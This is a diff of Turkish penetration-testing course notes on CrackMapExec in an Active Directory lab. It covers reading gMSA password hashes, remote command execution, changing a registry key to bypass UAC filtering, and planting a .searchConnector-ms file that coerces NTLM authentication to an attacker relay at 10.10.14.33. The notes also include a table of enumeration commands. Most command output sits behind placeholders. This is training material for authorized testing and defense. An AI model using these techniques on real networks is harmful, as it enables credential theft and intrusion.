+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -15830,138 +16847,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
-![Pasted image 20241203100321.png](/img/user/resimler/Pasted%20image%2020241203100321.png)
 
-![Pasted image 20241203100458.png](/img/user/resimler/Pasted%20image%2020241203100458.png)
+{{CODE_BLOCK_151}}
+
+
+{{CODE_BLOCK_152}}
 
 
 ### Domain Hesabı Olarak Komut Yürütme
-LocalAccountTokenFilterPolicy yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve administrators grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, INLANEFREIGHT\robert hesabı administrators grubunun bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
+
+`LocalAccountTokenFilterPolicy` yalnızca local hesaplar için geçerlidir. Bir domain kullanıcımız varsa ve `administrators` grubunun bir parçasıysa, UAC ayarıyla bile komutu çalıştırabiliriz. Bu senaryoda, `INLANEFREIGHT\robert` hesabı `administrators` `grubunun` bir üyesidir, yani UAC etkin olsa bile komutları yürütebilir.
 
 
 ### Komutu Robert olarak çalıştır
-![Pasted image 20241203100627.png](/img/user/resimler/Pasted%20image%2020241203100627.png)
+
+{{CODE_BLOCK_153}}
 
 
 ### SMB ile Komut Yürütme
-CME'nin dört (4) farklı komut yürütme yöntemi vardır:
-![Pasted image 20241203101103.png](/img/user/resimler/Pasted%20image%2020241203101103.png)
 
-Not: Tüm yöntemler tüm bilgisayarlarda çalışmayabilir.
+CME'nin dört (4) farklı komut yürütme yöntemi vardır:
+
+| Komut   | Açıklama                                                                                                                             |
+| ------- | ------------------------------------------------------------------------------------------------------------------------------------ |
+| wmiexec | WMI (Windows Management Instrumentation) kullanılarak komutlar yürütülür (`diskte dosya oluşturulur`).                               |
+| atexec  | Windows `görev zamanlayıcısı` ile bir görev planlayarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz). |
+| smbexec | Bir servis oluşturup çalıştırarak komutlar yürütülür (`fileless`, ancak Windows’un en son sürümünde çalışmaz).                       |
+| mmcexec | wmiexec yöntemine benzer, ancak komutlar Microsoft Yönetim Konsolu (MMC) aracılığıyla yürütülür.                                     |
+
+Not: Her yöntem her bilgisayarda çalışmayabilir.
 
 Varsayılan olarak, CME biri başarısız olursa farklı bir yürütme yöntemine geçecektir. Komutları aşağıdaki sırayla yürütmeye çalışır:
 
-![Pasted image 20241203101142.png](/img/user/resimler/Pasted%20image%2020241203101142.png)
+* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec
 
-CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin --exec-method bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
+CME'yi yalnızca bir yürütme yöntemi kullanmaya zorlamak istiyorsak, örneğin `--exec-method` bayrağını kullanarak hangisini kullanacağımızı belirtebiliriz:
 
 
 ### SMBExec Yöntemi ile Komut Yürütme
-![Pasted image 20241203101223.png](/img/user/resimler/Pasted%20image%2020241203101223.png)
+
+{{CODE_BLOCK_154}}
 
 Alternatif olarak, -X seçeneğini kullanarak PowerShell ile komutları çalıştırabiliriz:
 
-
 ### wmiexec aracılığıyla PowerShell Komut Yürütme
-![Pasted image 20241203101403.png](/img/user/resimler/Pasted%20image%2020241203101403.png)
-![Pasted image 20241203101435.png](/img/user/resimler/Pasted%20image%2020241203101435.png)
+
+{{CODE_BLOCK_155}}
+
 
 PowerShell seçeneği -X çalıştırıldığında, perde arkasında CrackMapExec aşağıdakileri yapacaktır:
 
@@ -17352,235 +18389,261 @@ Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP
 {{CODE_BLOCK_121}}
 
 ### drop-sc Modülü ile Hash'lerin Çalınması
-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
